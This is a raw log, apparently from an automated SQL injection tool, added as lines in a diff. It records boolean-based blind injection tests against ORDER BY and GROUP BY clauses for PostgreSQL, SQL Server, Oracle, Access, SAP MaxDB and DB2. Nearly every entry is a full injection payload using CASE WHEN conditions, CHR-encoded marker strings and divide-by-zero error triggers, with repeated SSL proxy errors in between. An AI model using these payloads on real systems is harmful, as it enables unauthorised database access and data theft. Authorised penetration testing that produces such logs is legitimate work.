+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (2351=2351) THEN 1 ELSE 1/(SELECT 0) END))-- -
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
+[08:25:22] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (2402=1138) THEN (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) ELSE 1/(SELECT 0) END))-- -
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:22] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (7796=7796) THEN (CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111)) ELSE 1/(SELECT 0) END))-- -
+[08:25:23] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:23] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:23] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:23] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:23] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
+[08:25:23] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT * FROM GENERATE_SERIES(1073,1073,CASE WHEN (1073=4157) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT * FROM GENERATE_SERIES(2827,2827,CASE WHEN (2827=2827) THEN 1 ELSE 0 END) LIMIT 1)-- -
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:24] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
+[08:25:24] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (9811=9659) THEN 1 ELSE 9811*(SELECT 9811 UNION ALL SELECT 9659) END))-- -
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (2817=2817) THEN 1 ELSE 2817*(SELECT 2817 UNION ALL SELECT 4326) END))-- -
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:25] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
+[08:25:25] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (8799=4699) THEN CHAR(112)+CHAR(108)+CHAR(67)+CHAR(70)+CHAR(114)+CHAR(69)+CHAR(56)+CHAR(79)+CHAR(121)+CHAR(82)+CHAR(65)+CHAR(104)+CHAR(50)+CHAR(57)+CHAR(57)+CHAR(57)+CHAR(110)+CHAR(53)+CHAR(77)+CHAR(74)+CHAR(114)+CHAR(103)+CHAR(71)+CHAR(107)+CHAR(119)+CHAR(108)+CHAR(50)+CHAR(71)+CHAR(52)+CHAR(118)+CHAR(115)+CHAR(75)+CHAR(97)+CHAR(104)+CHAR(81)+CHAR(103)+CHAR(53)+CHAR(101)+CHAR(75)+CHAR(111) ELSE 8799*(SELECT 8799 UNION ALL SELECT 4699) END))-- -
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (9185=9185) THEN CHAR(112)+CHAR(108)+CHAR(67)+CHAR(70)+CHAR(114)+CHAR(69)+CHAR(56)+CHAR(79)+CHAR(121)+CHAR(82)+CHAR(65)+CHAR(104)+CHAR(50)+CHAR(57)+CHAR(57)+CHAR(57)+CHAR(110)+CHAR(53)+CHAR(77)+CHAR(74)+CHAR(114)+CHAR(103)+CHAR(71)+CHAR(107)+CHAR(119)+CHAR(108)+CHAR(50)+CHAR(71)+CHAR(52)+CHAR(118)+CHAR(115)+CHAR(75)+CHAR(97)+CHAR(104)+CHAR(81)+CHAR(103)+CHAR(53)+CHAR(101)+CHAR(75)+CHAR(111) ELSE 9185*(SELECT 9185 UNION ALL SELECT 5949) END))-- -
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:26] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
+[08:25:26] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (1363=4182) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (5507=5507) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:27] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:25:27] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (7269=7896) THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (4804=4804) THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:28] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
+[08:25:28] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,IIF(1132=7070,1,1/0)-- -
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,IIF(8248=8248,1,1/0)-- -
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:25:30] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,IIF(4958=8657,CHR(112)&CHR(108)&CHR(67)&CHR(70)&CHR(114)&CHR(69)&CHR(56)&CHR(79)&CHR(121)&CHR(82)&CHR(65)&CHR(104)&CHR(50)&CHR(57)&CHR(57)&CHR(57)&CHR(110)&CHR(53)&CHR(77)&CHR(74)&CHR(114)&CHR(103)&CHR(71)&CHR(107)&CHR(119)&CHR(108)&CHR(50)&CHR(71)&CHR(52)&CHR(118)&CHR(115)&CHR(75)&CHR(97)&CHR(104)&CHR(81)&CHR(103)&CHR(53)&CHR(101)&CHR(75)&CHR(111),1/0)-- -
+[08:25:30] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:30] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:30] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:30] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:30] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,IIF(7491=7491,CHR(112)&CHR(108)&CHR(67)&CHR(70)&CHR(114)&CHR(69)&CHR(56)&CHR(79)&CHR(121)&CHR(82)&CHR(65)&CHR(104)&CHR(50)&CHR(57)&CHR(57)&CHR(57)&CHR(110)&CHR(53)&CHR(77)&CHR(74)&CHR(114)&CHR(103)&CHR(71)&CHR(107)&CHR(119)&CHR(108)&CHR(50)&CHR(71)&CHR(52)&CHR(118)&CHR(115)&CHR(75)&CHR(97)&CHR(104)&CHR(81)&CHR(103)&CHR(53)&CHR(101)&CHR(75)&CHR(111),1/0)-- -
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
+[08:25:31] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(CASE WHEN 1111=5885 THEN 1 ELSE NULL END)-- -
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:31] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(CASE WHEN 7986=7986 THEN 1 ELSE NULL END)-- -
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:25:32] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(CASE WHEN 9150=9398 THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE NULL END)-- -
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:32] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(CASE WHEN 1338=1338 THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE NULL END)-- -
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
+[08:25:33] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT CASE WHEN 2575=8738 THEN 1 ELSE RAISE_ERROR(70001, CHR(88)||CHR(102)||CHR(117)||CHR(88)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:33] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT CASE WHEN 6839=6839 THEN 1 ELSE RAISE_ERROR(70001, CHR(114)||CHR(78)||CHR(113)||CHR(102)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
+[08:25:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT CASE WHEN 8209=8553 THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE RAISE_ERROR(70001, CHR(75)||CHR(66)||CHR(98)||CHR(81)) END FROM SYSIBM.SYSDUMMY1)-- -
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT CASE WHEN 9659=9659 THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE RAISE_ERROR(70001, CHR(113)||CHR(78)||CHR(120)||CHR(114)) END FROM SYSIBM.SYSDUMMY1)-- -
